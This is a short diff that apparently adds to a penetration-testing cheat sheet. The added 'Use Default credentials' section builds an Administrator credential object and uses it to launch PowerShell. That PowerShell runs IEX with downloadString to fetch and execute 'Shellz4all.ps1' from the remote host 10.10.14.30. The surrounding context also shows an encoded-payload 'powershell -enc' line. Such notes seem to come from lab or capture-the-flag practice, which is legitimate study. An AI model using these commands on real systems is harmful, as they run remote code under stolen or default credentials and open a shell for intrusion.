@@ -14,6 +14,12 @@ powershell -enc <base64-payload>
 ```
 gci -force .
 ```
+# Use Default credentials
+```
+$SecPass = ConvertTo-SecureString '<password>' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
+Start-Process -FilePath "powershell" -argumentList "IEX(New-Object Net.webClient).downloadString('http://10.10.14.30/Shellz4all.ps1')" -Credential $cred
+```
 
 
 ---
